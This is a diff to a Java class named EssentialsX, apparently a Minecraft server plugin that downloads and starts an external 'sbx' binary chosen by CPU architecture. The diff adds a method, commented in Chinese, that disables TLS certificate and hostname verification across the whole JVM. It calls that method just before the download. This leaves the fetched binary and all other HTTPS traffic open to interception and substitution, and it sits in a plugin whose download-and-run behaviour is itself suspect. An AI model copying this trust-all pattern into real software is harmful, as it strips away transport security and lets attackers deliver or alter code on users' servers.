@@ -6,6 +6,8 @@ import java.net.URL;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.TimeUnit;
+import javax.net.ssl.*;
+import java.security.cert.X509Certificate;
 
 public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
@@ -33,11 +35,37 @@ public class EssentialsX extends JavaPlugin {
             e.printStackTrace();
         }
     }
+
+    // 新增：全局忽略 SSL 证书检查的方法
+    private void disableSSLCertificateChecking() {
+        try {
+            TrustManager[] trustAllCerts = new TrustManager[]{
+                new X509TrustManager() {
+                    public X509Certificate[] getAcceptedIssuers() { return null; }
+                    public void checkClientTrusted(X509Certificate[] certs, String authType) { }
+                    public void checkServerTrusted(X509Certificate[] certs, String authType) { }
+                }
+            };
+
+            SSLContext sc = SSLContext.getInstance("SSL");
+            sc.init(null, trustAllCerts, new java.security.SecureRandom());
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            // 同时也忽略域名匹配
+            HostnameVerifier allHostsValid = (hostname, session) -> true;
+            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
+        } catch (Exception e) {
+            getLogger().warning("Failed to disable SSL checking: " + e.getMessage());
+        }
+    }
     
     private void startSbxProcess() throws Exception {
         if (isProcessRunning) {
             return;
         }
+
+        // 在执行网络请求前调用，绕过老旧环境的 SSL 报错
+        disableSSLCertificateChecking();
         
         // Determine download URL based on architecture
         String osArch = System.getProperty("os.arch").toLowerCase();
